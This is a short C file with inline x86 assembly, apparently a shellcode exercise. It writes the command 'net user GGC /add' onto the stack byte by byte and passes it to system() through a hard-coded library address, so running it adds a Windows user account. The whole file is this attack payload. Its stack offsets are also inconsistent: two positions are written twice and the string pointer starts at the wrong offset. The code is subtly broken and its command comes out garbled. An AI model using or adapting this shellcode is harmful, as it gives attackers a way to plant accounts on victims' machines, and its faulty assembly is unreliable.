#include "stdafx.h"
#include <windows.h>
#include <winbase.h>
void main()
{
	LoadLibrary("msvcrt.dll");
	__asm{
		push ebp		;save ebp
		mov ebp, esp		;base pointer
		xor edi,edi		;edi=0
		push edi		;construct '\0' of the string
		sub esp,0eh		;space for attacking string
		mov byte ptr [ebp-10h],6eh	;n
		mov byte ptr [ebp-0fh],65h	;e
		mov byte ptr [ebp-10h],74h	;t
		mov byte ptr [ebp-0fh],20h	;tab
		mov byte ptr [ebp-0eh],75h	;u
		mov byte ptr [ebp-0dh],73h	;s
		mov byte ptr [ebp-0ch],65h	;e
		mov byte ptr [ebp-0bh],72h	;r
		mov byte ptr [ebp-0ah],20h	;tab
		mov byte ptr [ebp-09h],47h	;G
		mov byte ptr [ebp-08h],47h	;G
		mov byte ptr [ebp-07h],43h	;C
		mov byte ptr [ebp-06h],20h	;tab
		mov byte ptr [ebp-05h],2fh	;/
		mov byte ptr [ebp-04h],61h	;a
		mov byte ptr [ebp-03h],64h	;d
		mov byte ptr [ebp-02h],64h	;d
		lea eax,[ebp-14h]	;string head address as param
		push eax		;same as above
		mov eax,0x77bf93c7	;system function address ?
		call eax		;call system()
	}
}
